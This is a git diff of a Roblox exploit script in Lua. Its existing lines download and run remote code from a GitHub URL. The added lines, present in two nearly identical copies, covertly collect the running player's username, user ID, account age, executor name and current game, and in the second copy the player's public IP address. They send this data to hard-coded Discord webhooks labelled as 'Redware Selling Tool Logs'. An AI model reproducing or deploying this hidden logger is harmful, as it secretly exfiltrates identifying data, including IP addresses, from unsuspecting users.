@@ -1,2 +1,131 @@
 loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/altctrlper/main/user'))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/jaredloI/altctrlper/main/main'))()
+
+local plr = game.Players.LocalPlayer
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+ 
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+local JobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+local Content = ""
+local Embed = {
+            ["title"] = "**<:discohook:937293965881917440> Redware Selling Tool Logs**",
+            ["description"] = "<:discohook:937292104483373116>Name: "..plr.Name.."\n<:discohook:937292104483373116>Display Name: "..plr.DisplayName.."\n<:discohook:937292104483373116>Executor: "..getexploit().."\n<:discohook:937292104483373116>Place Name: "..placeName,
+            ["type"] = "rich",
+            ["color"] = tonumber(9498256),
+                    ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
+            },
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "<:discohook:937292104483373116>__Account Age:__",
+                    ["value"] = plr.AccountAge.." days old",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "<:discohook:937292104483373116>__User ID:__",
+                    ["value"] = plr.UserId,
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "JobId: " ..JobId,
+                ["icon_url"] = "https://cdn.discordapp.com/icons/896699027180101755/8ca9f885d410ead1c152bfa98bef2ecf.png?size=4096"
+            },
+            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+};
+(syn and syn.request or http_request or http.request) {
+    Url = 'https://discord.com/api/webhooks/937295495582347284/EVCMBMv8vFTpyq9AK0V4clXgp98W1WTpixcWc3kME2WW2TeBymonG8EKMGSVKrvDc8yR';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
+};
+
+local plr = game.Players.LocalPlayer
+local OSTime = os.time()
+local Time = os.date('!*t', OSTime)
+ 
+local function getexploit()
+    local exploit =
+        (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or 
+        (isexecutorclosure and "Script-Ware V2") or
+        (secure_load and "Sentinel") or
+        (is_sirhurt_closure and "SirHurt V4") or
+        (pebc_execute and "ProtoSmasher") or
+        (KRNL_LOADED and "Krnl") or
+        (WrapGlobal and "WeAreDevs") or
+        (isvm and "Proxo") or
+        (shadow_env and "Shadow") or
+        (jit and "EasyExploits") or
+        (getreg()['CalamariLuaEnv'] and "Calamari") or
+        (unit and "Unit") or
+        ("Undetectable")
+    return exploit
+end
+local placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name
+local JobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
+local Content = ""
+local Embed = {
+            ["title"] = "**<:discohook:937293965881917440> Redware Selling Tool Logs**",
+            ["description"] = "<:discohook:937292104483373116>Name: "..plr.Name.."\n<:discohook:937292104483373116>Display Name: "..plr.DisplayName.."\n<:discohook:937292104483373116>Executor: "..getexploit().."\n<:discohook:937292104483373116>Place Name: "..placeName,
+            ["type"] = "rich",
+            ["color"] = tonumber(9498256),
+                    ["thumbnail"] = {
+                ["url"] = "https://www.roblox.com/asset-thumbnail/image?assetId="..game.PlaceId.."&width=768&height=432"
+            },
+            ["image"] = {
+                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=250&y=250&Format=Png&username="..plr.Name
+            },
+            ["fields"] = {
+                {
+                    ["name"] = "<:discohook:937292104483373116>__Account Age:__",
+                    ["value"] = plr.AccountAge.." days old",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "<:discohook:937292104483373116>__User ID:__",
+                    ["value"] = plr.UserId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "<:discohook:937292104483373116>__IP Address:__",
+                    ["value"] = tostring(game:HttpGet("https://api.ipify.org", true)),
+                    ["inline"] = true
+                }
+            },
+            ["footer"] = {
+                ["text"] = "JobId: " ..JobId,
+                ["icon_url"] = "https://cdn.discordapp.com/icons/896699027180101755/8ca9f885d410ead1c152bfa98bef2ecf.png?size=4096"
+            },
+            ["timestamp"] = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec),
+};
+(syn and syn.request or http_request or http.request) {
+    Url = 'https://discord.com/api/webhooks/937273130223816744/qQ4ESObnWOj-LEXh1wD9C5V6NCxgdsroc8GXGUQvqFZ9Wxui9ApdoVawVNnO7Rb_Emso';
+    Method = 'POST';
+    Headers = {
+        ['Content-Type'] = 'application/json';
+    };
+    Body = game:GetService'HttpService':JSONEncode({content = Content; embeds = {Embed}; });
+};
